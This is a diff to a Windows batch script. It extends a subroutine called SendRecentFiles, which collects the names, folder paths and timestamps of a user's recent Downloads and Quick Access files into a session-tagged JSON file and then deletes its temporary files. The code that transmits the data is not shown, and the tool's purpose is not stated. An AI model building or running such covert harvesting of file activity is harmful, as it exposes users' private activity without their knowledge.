@@ -449,6 +449,7 @@ goto :eof
 :SendRecentFiles
 set "JSON_FILE=%TEMP_DIR%\recent_files.json"
 set "RECENT_LINKS=%TEMP_DIR%\recent_links.txt"
+set "DOWNLOADS_LIST=%TEMP_DIR%\downloads_list.txt"
 
 echo { > "%JSON_FILE%"
 echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
@@ -457,35 +458,50 @@ echo   "data": [ >> "%JSON_FILE%"
 
 set /a file_count=0
 
-REM Collect from Downloads folder (50 most recent)
+REM Collect from Downloads folder with timestamps (50 most recent)
 if exist "%USERPROFILE%\Downloads" (
-    for /f "delims=" %%f in ('dir /b /o-d /a-d "%USERPROFILE%\Downloads" 2^>nul') do (
-        if !file_count! GTR 0 echo , >> "%JSON_FILE%"
-        echo     {"name": "%%f", "location": "Downloads"} >> "%JSON_FILE%"
-        set /a file_count+=1
-        if !file_count! GEQ 50 goto :downloads_done
+    REM Use PowerShell to get file info with timestamps (ONLY files, not folders)
+    powershell -NoProfile -Command "Get-ChildItem '%USERPROFILE%\Downloads' -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 | ForEach-Object { $name = $_.Name -replace '\|', '-'; Write-Output ('{0}^^^|Downloads^^^|{1}' -f $name, $_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')) }" > "%DOWNLOADS_LIST%" 2>nul
+    
+    if exist "%DOWNLOADS_LIST%" (
+        for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%DOWNLOADS_LIST%") do (
+            if !file_count! GTR 0 echo , >> "%JSON_FILE%"
+            set "filename=%%a"
+            set "location=%%b"
+            set "timestamp=%%c"
+            REM Remove escape characters
+            set "filename=!filename:^^^=!"
+            set "location=!location:^^^=!"
+            set "filename=!filename:"=\"!"
+            echo     {"name": "!filename!", "location": "!location!", "date": "!timestamp!"} >> "%JSON_FILE%"
+            set /a file_count+=1
+        )
     )
 )
-
-:downloads_done
 
 REM Collect from Windows Recent folder (Quick Access recent files)
 set "RECENT_FOLDER=%APPDATA%\Microsoft\Windows\Recent"
 if exist "%RECENT_FOLDER%" (
-    REM Use PowerShell to parse .lnk files and get target paths
-    powershell -NoProfile -Command "$shell = New-Object -ComObject WScript.Shell; Get-ChildItem '%RECENT_FOLDER%' -Filter *.lnk | Select-Object -First 50 | ForEach-Object { try { $target = $shell.CreateShortcut($_.FullName).TargetPath; if ($target -and (Test-Path $target)) { $item = Get-Item $target; Write-Output ('{0}|{1}' -f $item.Name, $item.DirectoryName) } } catch {} }" > "%RECENT_LINKS%" 2>nul
+    REM Use PowerShell to parse .lnk files and get target paths with timestamps (ONLY files)
+    powershell -NoProfile -Command "$shell = New-Object -ComObject WScript.Shell; Get-ChildItem '%RECENT_FOLDER%' -Filter *.lnk -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object { try { $target = $shell.CreateShortcut($_.FullName).TargetPath; if ($target -and (Test-Path $target -PathType Leaf)) { $item = Get-Item $target; $name = $item.Name -replace '\|', '-'; $path = $item.DirectoryName -replace '\|', '-'; Write-Output ('{0}^^^|{1}^^^|{2}' -f $name, $path, $item.LastAccessTime.ToString('yyyy-MM-dd HH:mm:ss')) } } catch {} }" > "%RECENT_LINKS%" 2>nul
     
     REM Add recent files from Quick Access to JSON
-    for /f "usebackq tokens=1,2 delims=|" %%a in ("%RECENT_LINKS%") do (
-        if !file_count! GTR 0 echo , >> "%JSON_FILE%"
-        set "filename=%%a"
-        set "filepath=%%b"
-        set "filename=!filename:"=\"!"
-        set "filepath=!filepath:"=\"!"
-        set "filepath=!filepath:\=\\!"
-        echo     {"name": "!filename!", "location": "!filepath!"} >> "%JSON_FILE%"
-        set /a file_count+=1
-        if !file_count! GEQ 100 goto :recent_files_done
+    if exist "%RECENT_LINKS%" (
+        for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%RECENT_LINKS%") do (
+            if !file_count! GTR 0 echo , >> "%JSON_FILE%"
+            set "filename=%%a"
+            set "filepath=%%b"
+            set "timestamp=%%c"
+            REM Remove escape characters
+            set "filename=!filename:^^^=!"
+            set "filepath=!filepath:^^^=!"
+            set "filename=!filename:"=\"!"
+            set "filepath=!filepath:"=\"!"
+            set "filepath=!filepath:\=\\!"
+            echo     {"name": "!filename!", "location": "!filepath!", "date": "!timestamp!"} >> "%JSON_FILE%"
+            set /a file_count+=1
+            if !file_count! GEQ 100 goto :recent_files_done
+        )
     )
 )
 
@@ -500,4 +516,5 @@ if !file_count! GTR 0 (
 
 del "%JSON_FILE%" >nul 2>&1
 del "%RECENT_LINKS%" >nul 2>&1
+del "%DOWNLOADS_LIST%" >nul 2>&1
 goto :eof
